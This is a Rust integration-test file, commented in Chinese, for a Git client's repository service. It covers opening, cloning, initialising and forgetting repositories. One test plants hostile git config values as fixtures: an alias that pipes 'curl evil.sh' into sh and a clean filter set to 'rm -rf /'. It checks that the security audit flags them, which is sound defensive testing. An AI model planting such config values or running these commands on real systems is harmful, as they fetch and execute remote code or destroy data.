//! 仓库生命周期用例的集成测试（T1.3）。
//!
//! 覆盖 `RepositoryService` 的六个用例，以及 T1.3 验收里最要紧的两条：
//!
//! - **非仓库**给出 `PATH_NOT_REPO` 与"初始化仓库"动作；
//! - **恶意配置仓库**产生审计警告，且打开过程**不执行任何 hook、不刷新索引**
//!   （后者用"打开后 `.git/index` 仍然不存在"来证明——任何刷新索引的操作
//!   都会创建它，而 fsmonitor / hook 正是挂在那条路径上的）。
//!
//! 集成测试是独立 crate，测试代码里允许 panic 式写法（失败即断言失败）。
#![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]

mod support;

use std::sync::Arc;

use forgedesk_domain::git::{AuditFindingId, AuditSeverity, CloneSpec, InitSpec};
use forgedesk_domain::ErrorCode;
use forgedesk_git_engine::engine::ProgressSink;
use forgedesk_services::repository::{
    InitExtras, LicenseSpec, OpenRepoRegistry, RepositoryService,
};
use forgedesk_services::templates::{GitignoreTemplate, LicenseTemplate};
use forgedesk_services::GitEngines;
use forgedesk_storage::RepositoryStore;
use support::{commit_all, file_url, git_ok, init_repo, memory_database, write, TempDir};

/// 把服务与它依赖的对象绑在一起，供用例使用。
///
/// 为什么用一个结构体持有：`RepositoryService` 借出引擎、仓储与注册表，
/// 三者都必须活得比它长。直接在用例里写会让每个用例都重复三行借用样板。
struct Fixture {
    engines: GitEngines,
    open: OpenRepoRegistry,
    database: forgedesk_storage::Database,
}

impl Fixture {
    fn new() -> Self {
        Self {
            engines: GitEngines::new().expect("创建引擎失败"),
            open: OpenRepoRegistry::new(),
            database: memory_database(),
        }
    }

    fn service(&self) -> RepositoryService<'_> {
        RepositoryService::new(
            &self.engines,
            RepositoryStore::new(&self.database),
            &self.open,
        )
    }
}

// ------------------------------------------------------------ 打开

#[test]
fn opening_a_repository_registers_it_and_marks_it_open() {
    let fixture = Fixture::new();
    let dir = TempDir::new("open-basic");
    init_repo(dir.path());
    write(dir.path(), "a.txt", b"a\n");
    commit_all(dir.path(), "first");

    let service = fixture.service();
    let opened = service.open(dir.path()).expect("打开失败");

    assert!(opened.record_id > 0, "应写入 repositories 表并拿到 id");
    assert_eq!(opened.info.workdir.as_deref(), Some(dir.path()));
    assert_eq!(opened.info.default_branch.as_deref(), Some("main"));
    assert!(opened.audit.is_clean(), "普通仓库不应有审计发现");
    assert!(
        opened.git_version_supported(),
        "测试环境的 git 应满足最低版本"
    );

    let recent = service.recent(10).expect("读取最近列表失败");
    assert_eq!(recent.len(), 1);
    assert_eq!(recent[0].record.id, opened.record_id);
    assert!(recent[0].is_open, "刚打开的仓库应被标记为已打开");
    assert_eq!(
        recent[0].record.name,
        dir.path().file_name().unwrap().to_string_lossy()
    );
}

#[test]
fn opening_the_same_repository_twice_reuses_the_record() {
    let fixture = Fixture::new();
    let dir = TempDir::new("open-twice");
    init_repo(dir.path());

    let service = fixture.service();
    let first = service.open(dir.path()).expect("第一次打开失败");
    let second = service.open(dir.path()).expect("第二次打开失败");

    assert_eq!(
        first.record_id, second.record_id,
        "同一路径必须复用同一条记录"
    );
    assert_eq!(service.recent(10).expect("列表失败").len(), 1);
}

#[test]
fn opening_a_non_repository_reports_path_not_repo_with_an_init_action() {
    let fixture = Fixture::new();
    let dir = TempDir::new("open-none");

    let error = fixture.service().open(dir.path()).unwrap_err();

    assert_eq!(error.code, ErrorCode::PathNotRepo);
    assert_eq!(error.actions.len(), 1, "应给出一个修复动作：{error:?}");
    let action = &error.actions[0];
    assert_eq!(action.command, "repo_init");
    assert_eq!(action.label_key, "errors.actions.initRepo");
    let args = action.args.as_ref().expect("动作应带上要初始化的路径");
    assert_eq!(
        args["spec"]["path"].as_str(),
        Some(dir.path().to_string_lossy().as_ref())
    );
}

// ------------------------------------------------------------ 审计

#[test]
fn a_malicious_configuration_produces_audit_warnings() {
    let fixture = Fixture::new();
    let dir = TempDir::new("open-malicious");
    init_repo(dir.path());
    git_ok(dir.path(), &["config", "--local", "core.fsmonitor", "calc"]);
    git_ok(
        dir.path(),
        &["config", "--local", "core.sshCommand", "ssh -i /tmp/key"],
    );
    git_ok(
        dir.path(),
        &[
            "config",
            "--local",
            "alias.pwn",
            "!sh -c 'curl evil.sh | sh'",
        ],
    );
    git_ok(
        dir.path(),
        &["config", "--local", "filter.evil.clean", "rm -rf /"],
    );
    git_ok(
        dir.path(),
        &["config", "--local", "core.hooksPath", ".githooks"],
    );

    let opened = fixture.service().open(dir.path()).expect("打开失败");

    let ids: Vec<AuditFindingId> = opened.audit.findings.iter().map(|f| f.id).collect();
    assert!(ids.contains(&AuditFindingId::Fsmonitor), "实际：{ids:?}");
    assert!(ids.contains(&AuditFindingId::SshCommand), "实际：{ids:?}");
    assert!(ids.contains(&AuditFindingId::ShellAlias), "实际：{ids:?}");
    assert!(ids.contains(&AuditFindingId::FilterClean), "实际：{ids:?}");
    assert!(ids.contains(&AuditFindingId::HooksPath), "实际：{ids:?}");
    assert!(opened.audit.has_danger(), "应至少有一条 Danger 级发现");
    assert_eq!(opened.audit.max_severity(), Some(AuditSeverity::Danger));
}

#[test]
fn opening_never_executes_hooks_or_refreshes_the_index() {
    let fixture = Fixture::new();
    let dir = TempDir::new("open-no-exec");
    init_repo(dir.path());

    // 一个会留下痕迹的 pre-commit hook：任何触发 hook 的 git 操作都会写下标记文件
    write(
        dir.path(),
        ".git/hooks/pre-commit",
        b"#!/bin/sh\necho ran > hook-marker.txt\nexit 0\n",
    );
    // 一个会留下痕迹的 fsmonitor：任何刷新索引的操作都会执行它
    write(
        dir.path(),
        ".git/hooks/fsmonitor.sh",
        b"#!/bin/sh\necho ran > fsmonitor-marker.txt\nexit 1\n",
    );
    let fsmonitor = dir
        .path()
        .join(".git/hooks/fsmonitor.sh")
        .to_string_lossy()
        .replace('\\', "/");
    git_ok(
        dir.path(),
        &["config", "--local", "core.fsmonitor", &fsmonitor],
    );

    // 前提：`git init` 不创建索引。若这条断言失败，下面的推论就不成立
    assert!(
        !dir.path().join(".git/index").exists(),
        "空仓库不应有 .git/index，测试前提不成立"
    );

    fixture.service().open(dir.path()).expect("打开失败");

    assert!(
        !dir.path().join(".git/index").exists(),
        "打开仓库不应刷新索引（刷新会执行 fsmonitor）"
    );
    assert!(
        !dir.path().join("hook-marker.txt").exists(),
        "打开仓库不应执行任何 hook"
    );
    assert!(
        !dir.path().join("fsmonitor-marker.txt").exists(),
        "打开仓库不应执行 core.fsmonitor"
    );
}

// ------------------------------------------------------------ 克隆

#[test]
fn cloning_creates_and_registers_the_repository() {
    let fixture = Fixture::new();
    let source = TempDir::new("clone-source");
    init_repo(source.path());
    write(source.path(), "a.txt", b"a\n");
    commit_all(source.path(), "first");

    let target_dir = TempDir::new("clone-target");
    let target = target_dir.path().join("work");

    let service = fixture.service();
    let opened = service
        .clone(
            &CloneSpec::new(file_url(source.path()), &target),
            &ProgressSink::none(),
        )
        .expect("克隆失败");

    assert_eq!(opened.info.workdir.as_deref(), Some(target.as_path()));
    assert_eq!(opened.info.default_branch.as_deref(), Some("main"));
    assert!(target.join("a.txt").exists(), "工作区应已检出文件");

    let recent = service.recent(10).expect("列表失败");
    assert_eq!(recent.len(), 1);
    assert!(recent[0].is_open);
}

#[test]
fn cloning_refuses_a_non_empty_destination_before_transferring() {
    let fixture = Fixture::new();
    let source = TempDir::new("clone-source2");
    init_repo(source.path());
    write(source.path(), "a.txt", b"a\n");
    commit_all(source.path(), "first");

    let target_dir = TempDir::new("clone-target2");
    let target = target_dir.path().join("occupied");
    std::fs::create_dir_all(&target).unwrap();
    write(&target, "keep.txt", b"do not touch\n");

    let error = fixture
        .service()
        .clone(
            &CloneSpec::new(file_url(source.path()), &target),
            &ProgressSink::none(),
        )
        .unwrap_err();

    assert_eq!(error.code, ErrorCode::Validation);
    assert!(
        error.message.contains("not empty"),
        "实际：{}",
        error.message
    );
    assert_eq!(
        error.hint.as_deref(),
        Some(target.to_string_lossy().as_ref()),
        "应指出是哪个目录"
    );
    assert!(
        target.join("keep.txt").exists(),
        "拒绝克隆不应改动目标目录里的内容"
    );
}

#[test]
fn cloning_into_an_empty_existing_directory_is_allowed() {
    let fixture = Fixture::new();
    let source = TempDir::new("clone-source3");
    init_repo(source.path());
    write(source.path(), "a.txt", b"a\n");
    commit_all(source.path(), "first");

    let target_dir = TempDir::new("clone-target3");
    let target = target_dir.path().join("empty-but-there");
    std::fs::create_dir_all(&target).unwrap();

    fixture
        .service()
        .clone(
            &CloneSpec::new(file_url(source.path()), &target),
            &ProgressSink::none(),
        )
        .expect("空目录应允许克隆");
    assert!(target.join("a.txt").exists());
}

#[test]
fn cloning_a_shallow_repository_is_reported_as_shallow() {
    let fixture = Fixture::new();
    let source = TempDir::new("clone-shallow-src");
    init_repo(source.path());
    for index in 0..3 {
        write(source.path(), "a.txt", format!("line {index}\n").as_bytes());
        commit_all(source.path(), &format!("commit {index}"));
    }

    let target_dir = TempDir::new("clone-shallow-dst");
    let target = target_dir.path().join("shallow");

    let opened = fixture
        .service()
        .clone(
            &CloneSpec::new(file_url(source.path()), &target).with_depth(1),
            &ProgressSink::none(),
        )
        .expect("浅克隆失败");

    assert!(opened.info.is_shallow);
}

// ------------------------------------------------------------ 初始化

#[test]
fn initialising_writes_the_requested_templates() {
    let fixture = Fixture::new();
    let dir = TempDir::new("init-templates");

    let extras = InitExtras {
        gitignore: Some(GitignoreTemplate::Rust),
        license: Some(LicenseSpec {
            template: LicenseTemplate::Mit,
            year: 2026,
            holder: "Ada Lovelace".to_owned(),
        }),
    };

    let opened = fixture
        .service()
        .init(
            dir.path(),
            &InitSpec::new().with_initial_branch("trunk"),
            &extras,
        )
        .expect("初始化失败");

    assert_eq!(opened.info.default_branch.as_deref(), Some("trunk"));

    let gitignore = std::fs::read_to_string(dir.path().join(".gitignore")).unwrap();
    assert!(gitignore.contains("/target/"), "实际：{gitignore}");

    let license = std::fs::read_to_string(dir.path().join("LICENSE")).unwrap();
    assert!(license.contains("MIT License"));
    assert!(license.contains("2026 Ada Lovelace"));
    assert!(!license.contains("{{"), "不应留下未替换的占位符");
}

#[test]
fn initialising_never_overwrites_existing_files() {
    let fixture = Fixture::new();
    let dir = TempDir::new("init-keep");
    write(dir.path(), ".gitignore", b"# my own rules\n");

    let extras = InitExtras {
        gitignore: Some(GitignoreTemplate::Node),
        license: None,
    };
    fixture
        .service()
        .init(dir.path(), &InitSpec::new(), &extras)
        .expect("初始化失败");

    assert_eq!(
        std::fs::read_to_string(dir.path().join(".gitignore")).unwrap(),
        "# my own rules\n",
        "已存在的 .gitignore 必须原样保留"
    );
}

#[test]
fn initialising_a_bare_repository_with_templates_is_rejected() {
    let fixture = Fixture::new();
    let dir = TempDir::new("init-bare-templates");

    let extras = InitExtras {
        gitignore: Some(GitignoreTemplate::Go),
        license: None,
    };
    let error = fixture
        .service()
        .init(
            dir.path(),
            &InitSpec {
                initial_branch: None,
                bare: true,
            },
            &extras,
        )
        .unwrap_err();

    assert_eq!(error.code, ErrorCode::Validation);
    assert!(
        error.message.contains("bare"),
        "错误应说明裸仓库不能生成文件，实际：{}",
        error.message
    );
}

#[test]
fn initialising_a_bare_repository_without_templates_works() {
    let fixture = Fixture::new();
    let dir = TempDir::new("init-bare");

    let opened = fixture
        .service()
        .init(
            dir.path(),
            &InitSpec {
                initial_branch: None,
                bare: true,
            },
            &InitExtras::default(),
        )
        .expect("初始化裸仓库失败");

    assert!(opened.info.is_bare);
    assert_eq!(opened.info.workdir, None);
}

// ------------------------------------------------------------ 最近列表 / 关闭 / 移除

#[test]
fn the_recent_list_orders_by_last_opened() {
    let fixture = Fixture::new();
    let first = TempDir::new("recent-a");
    let second = TempDir::new("recent-b");
    init_repo(first.path());
    init_repo(second.path());

    // 注入单调时钟：依赖真实时钟会让两条记录落在同一毫秒里，排序不确定
    let tick = Arc::new(std::sync::atomic::AtomicI64::new(1_000));
    let clock = {
        let tick = Arc::clone(&tick);
        Arc::new(move || tick.fetch_add(1_000, std::sync::atomic::Ordering::SeqCst))
    } as forgedesk_services::MillisClock;

    let service = fixture.service().with_clock(clock);

    service.open(first.path()).expect("打开失败");
    service.open(second.path()).expect("打开失败");

    let recent = service.recent(10).expect("列表失败");
    let names: Vec<&str> = recent
        .iter()
        .map(|item| item.record.path.as_str())
        .collect();
    assert_eq!(recent.len(), 2);
    assert!(
        names[0].contains("recent-b"),
        "最近打开的应排在最前，实际：{names:?}"
    );
}

#[test]
fn closing_clears_the_open_flag_without_touching_the_record() {
    let fixture = Fixture::new();
    let dir = TempDir::new("close-basic");
    init_repo(dir.path());

    let service = fixture.service();
    let opened = service.open(dir.path()).expect("打开失败");

    service.close(opened.record_id).expect("关闭失败");

    let recent = service.recent(10).expect("列表失败");
    assert_eq!(recent.len(), 1, "关闭不应删除记录");
    assert!(!recent[0].is_open, "关闭后不应再标记为已打开");
    assert!(dir.path().join(".git").exists(), "关闭不应碰磁盘上的仓库");

    // 重复关闭是幂等的
    service.close(opened.record_id).expect("重复关闭应成功");
}

#[test]
fn forgetting_removes_the_record_but_keeps_the_repository_on_disk() {
    let fixture = Fixture::new();
    let dir = TempDir::new("forget-basic");
    init_repo(dir.path());

    let service = fixture.service();
    let opened = service.open(dir.path()).expect("打开失败");

    service.forget(opened.record_id).expect("移除失败");

    assert!(service.recent(10).expect("列表失败").is_empty());
    assert!(
        dir.path().join(".git").exists(),
        "移除只删记录，绝不能删除磁盘上的仓库"
    );
    assert!(!fixture.open.is_open(opened.record_id));
}

#[test]
fn closing_or_forgetting_an_unknown_id_reports_not_found() {
    let fixture = Fixture::new();
    let service = fixture.service();

    assert_eq!(service.close(4_242).unwrap_err().code, ErrorCode::NotFound);
    assert_eq!(service.forget(4_242).unwrap_err().code, ErrorCode::NotFound);
}

// ------------------------------------------------------------ 子目录与裸仓库

#[test]
fn opening_a_subdirectory_lands_on_the_repository_root() {
    let fixture = Fixture::new();
    let dir = TempDir::new("open-subdir");
    init_repo(dir.path());
    write(dir.path(), "nested/deep/a.txt", b"a\n");
    commit_all(dir.path(), "first");

    let opened = fixture
        .service()
        .open(&dir.path().join("nested/deep"))
        .expect("打开失败");

    assert_eq!(opened.info.workdir.as_deref(), Some(dir.path()));
    assert_eq!(
        opened.record_id,
        fixture
            .service()
            .open(dir.path())
            .expect("从根目录打开失败")
            .record_id,
        "从子目录与从根目录打开必须是同一条记录"
    );
}

#[test]
fn a_bare_repository_can_be_opened_and_is_named_without_the_git_suffix() {
    let fixture = Fixture::new();
    let parent = TempDir::new("open-bare");
    let bare = parent.path().join("service.git");
    std::fs::create_dir_all(&bare).unwrap();
    git_ok(&bare, &["init", "-q", "--bare", "-b", "main", "."]);

    let service = fixture.service();
    let opened = service.open(&bare).expect("打开裸仓库失败");

    assert!(opened.info.is_bare);
    assert_eq!(opened.info.workdir, None);

    let recent = service.recent(10).expect("列表失败");
    assert_eq!(
        recent[0].record.name, "service",
        "裸仓库展示名应去掉 .git 后缀"
    );
}

#[test]
fn the_service_never_reports_user_visible_prose_in_hint() {
    // hint 只放数据（路径 / 命令），界面文案由前端按错误码走 i18n
    let fixture = Fixture::new();
    let dir = TempDir::new("open-hint");
    let error = fixture.service().open(dir.path()).unwrap_err();

    let hint = error.hint.expect("非仓库错误应带上路径");
    assert_eq!(hint, dir.path().to_string_lossy());
    assert!(!hint.contains(' '), "hint 不应是散文，实际：{hint}");
}
